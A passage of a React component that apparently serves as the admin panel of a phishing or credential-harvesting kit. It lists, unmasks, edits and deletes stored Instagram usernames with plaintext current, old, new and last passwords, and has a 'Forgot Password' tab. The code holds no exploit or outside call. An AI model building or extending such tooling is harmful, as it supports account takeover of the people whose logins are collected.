  const visibleKeys = visible.flatMap(r => columns.map(c => `${r.id}:${c.key}`));
  const allRevealed = visibleKeys.length > 0 && visibleKeys.every(k => revealed.has(k));

  const toggleReveal = key => setRevealed(prev => {
    const next = new Set(prev); next.has(key) ? next.delete(key) : next.add(key); return next;
  });
  const toggleRevealAll = () => setRevealed(prev => {
    const next = new Set(prev);
    if (allRevealed) visibleKeys.forEach(k => next.delete(k));
    else             visibleKeys.forEach(k => next.add(k));
    return next;
  });

  const saveEdit = async (updated) => {
    // Optimistic local update
    setItems(prev => prev.map(r => r.id === updated.id ? updated : r));
    setEditing(null);
    try {
      await fetch(`${InstagramEndpoints.backendBaseUrl}/api/instagram/${updated.id}`, {
        method: "PUT",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          username: updated.username,
          password: updated.password,
          oldPassword: updated.oldPassword,
          newPassword: updated.newPassword,
          lastPassword: updated.lastPassword,
        }),
      });
    } catch (err) {
      console.error("Update failed:", err);
      load();
    }
  };
  const confirmDelete = async () => {
    const ids = deleting;
    const idSet = new Set(ids);
    // Optimistic local removal
    setItems(prev => prev.filter(r => !idSet.has(r.id)));
    setSelected(prev => new Set([...prev].filter(id => !idSet.has(id))));
    setRevealed(prev => new Set([...prev].filter(k => !idSet.has(k.split(":")[0]))));
    setDeleting(null);
    try {
      if (ids.length === 1) {
        await fetch(`${InstagramEndpoints.backendBaseUrl}/api/instagram/${ids[0]}`, {
          method: "DELETE",
        });
      } else {
        await fetch(`${InstagramEndpoints.backendBaseUrl}/api/instagram`, {
          method: "DELETE",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ ids }),
        });
      }
    } catch (err) {
      console.error("Delete failed:", err);
      load();
    }
  };

  const confirmClearAll = async () => {
    setItems([]);
    setSelected(new Set());
    setRevealed(new Set());
    setClearingAll(false);
    try {
      await fetch(`${InstagramEndpoints.backendBaseUrl}/api/instagram/all`, {
        method: "DELETE",
      });
    } catch (err) {
      console.error("Clear all failed:", err);
      load();
    }
  };

  return (
    <div className="flex-1 flex flex-col overflow-hidden bg-[#060d1c] text-[#a0bce0] font-mono">

      {/* ── Tab bar ── */}
      <div className="shrink-0 border-b border-[#131e35] bg-[#060d1c] px-3 flex items-center gap-1 pt-2">
        <button
          onClick={() => setView("credentials")}
          className={`flex items-center gap-1.5 px-3 py-2 text-[11px] font-semibold tracking-widest uppercase border-b-2 transition-all cursor-pointer ${
            view === "credentials"
              ? "border-[#3d7aba] text-[#6ab0ff]"
              : "border-transparent text-[#3a5a8a] hover:text-[#6b8cba] hover:border-[#1e3260]"
          }`}
        >
          <FiDatabase size={12} />
          Credentials
        </button>
        <button
          onClick={() => setView("forgot")}
          className={`flex items-center gap-1.5 px-3 py-2 text-[11px] font-semibold tracking-widest uppercase border-b-2 transition-all cursor-pointer ${
            view === "forgot"
              ? "border-[#3d7aba] text-[#6ab0ff]"
              : "border-transparent text-[#3a5a8a] hover:text-[#6b8cba] hover:border-[#1e3260]"
          }`}
        >
          <FiMail size={12} />
          Forgot Password
        </button>
      </div>

      {/* ── Forgot view ── */}
      {view === "forgot" && <ForgotView />}

      {/* ── Credentials view ── */}
      {view === "credentials" && (<>

      {/* ── Controls bar ── */}
      <div className="shrink-0 border-b border-[#131e35] bg-[#080f1e] px-3 py-2">
        <div className="flex flex-wrap items-center gap-3">

          {/* Dropdowns */}
          <Dropdown label="Service" options={SERVICES} value={service} onChange={setService} />
          <Dropdown label="Type"    options={TYPES}    value={type}    onChange={setType}    />

          {/* Search */}
          <div className="relative w-44">
            <FiSearch size={12} className="pointer-events-none absolute left-2.5 top-1/2 -translate-y-1/2 text-[#3a5a8a]" />
            <input type="text" value={query} onChange={e => setQuery(e.target.value)}
              placeholder="Username or service…"
              className="h-7 w-full rounded border border-[#1e3260] bg-[#0b1527] pl-7 pr-7 text-[11px] text-[#a0bce0] outline-none transition-colors placeholder:text-[#2a4a7a] hover:border-[#3d7aba] focus:border-[#3d7aba]" />
            {query && (
              <button onClick={() => setQuery("")}
                className="absolute right-2 top-1/2 -translate-y-1/2 text-[#3a5a8a] hover:text-[#a0bce0] cursor-pointer">
                <FiX size={11} />
              </button>
            )}
          </div>

          {/* Refresh */}
          <button onClick={load} disabled={loading}
            className="flex h-7 items-center gap-1.5 rounded border border-[#1e3260] bg-[#0b1527] px-2.5 text-[11px] text-[#6b8cba] hover:border-[#3d7aba] hover:text-[#a0bce0] transition-colors disabled:opacity-50 disabled:cursor-not-allowed cursor-pointer">
            <FiRefreshCw size={12} className={loading ? "animate-spin" : ""} />
            Refresh
          </button>

          {/* Clear All */}
          <button onClick={() => setClearingAll(true)} disabled={loading || items.length === 0}
            className="flex h-7 items-center gap-1.5 rounded border border-[#1e3260] bg-[#0b1527] px-2.5 text-[11px] text-[#6b8cba] hover:border-red-500/50 hover:text-red-400 transition-colors disabled:opacity-50 disabled:cursor-not-allowed cursor-pointer">
            <FiTrash2 size={12} />
            Clear All
          </button>
        </div>
      </div>

      {/* ── Body ── */}
      <div className="flex-1 overflow-y-auto px-3 py-2">
        {loading ? (
          <SkeletonTable columns={columns} />
        ) : error ? (
          <div className="mx-auto max-w-sm py-16 text-center">
            <p className="text-[15px] font-bold text-[#a0bce0]">Loading failed</p>
            <p className="mt-1 text-[12px] text-[#3a5a8a]">{error}</p>
            <button onClick={load}
              className="mt-4 rounded border border-[#1e3260] px-3 py-1.5 text-[13px] text-[#6b8cba] hover:border-[#3d7aba] cursor-pointer">
              Try again
            </button>
          </div>
        ) : visible.length === 0 ? (
          <EmptyState service={service} type={type} searching={query.trim().length > 0} onClear={() => setQuery("")} />
        ) : (
          <>
            {/* Toolbar */}
            <div className="sticky top-0 z-10 bg-[#060d1c] pb-1.5">
              <div className="flex min-h-[2rem] items-center gap-2 rounded border border-[#131e35] bg-[#0b1527] px-3 py-1">
                <Checkbox checked={allSelected} indeterminate={someSelected} onChange={toggleAll} label="Select all" />
                <span className="flex-1 text-[11px] text-[#6b8cba]">
                  {selectedVisible.length > 0
                    ? `${selectedVisible.length} of ${visible.length} selected`
                    : `${visible.length} records`}
                </span>

                <button onClick={toggleRevealAll} aria-pressed={allRevealed}
                  className="flex items-center gap-1.5 rounded border border-[#1e3260] px-2 py-1 text-[11px] text-[#6b8cba] hover:border-[#3d7aba] hover:text-[#a0bce0] transition-colors cursor-pointer">
                  {allRevealed ? <FiEyeOff size={12} className="text-[#3d7aba]" /> : <FiEye size={12} className="text-[#3d7aba]" />}
                  {allRevealed ? "Hide all" : "View all"}
                </button>

                {selectedVisible.length > 0 && (
                  <button onClick={() => setDeleting(selectedVisible.map(r => r.id))}
                    className="flex items-center gap-1.5 rounded border border-red-500/40 bg-red-500/10 px-3 py-1 text-[11px] text-red-400 hover:bg-red-500/20 transition-colors cursor-pointer">
                    <FiTrash2 size={12} /> Delete selected
                  </button>
                )}
              </div>
            </div>

            {/* Table */}
            <div className="overflow-x-auto rounded border border-[#131e35] bg-[#0b1527]">
              <table className="w-full min-w-[720px]">
                <TableHead columns={columns} />
                <tbody>
                  {visible.map(item => (
                    <CredentialRow
                      key={item.id} item={item}
                      selected={selected.has(item.id)} columns={columns} revealed={revealed}
                      onSelect={() => toggleOne(item.id)} onToggleReveal={toggleReveal}
                      onEdit={() => setEditing(item)} onDelete={() => setDeleting([item.id])}
                    />
                  ))}
                </tbody>
              </table>
            </div>
          </>
        )}
      </div>

      {editing  && <EditDialog item={editing} onSave={saveEdit} onClose={() => setEditing(null)} />}
      {deleting && <DeleteDialog count={deleting.length} onConfirm={confirmDelete} onClose={() => setDeleting(null)} />}
      {clearingAll && <DeleteDialog count={items.length} isAll onConfirm={confirmClearAll} onClose={() => setClearingAll(false)} />}
      </>)}
    </div>
  );
}
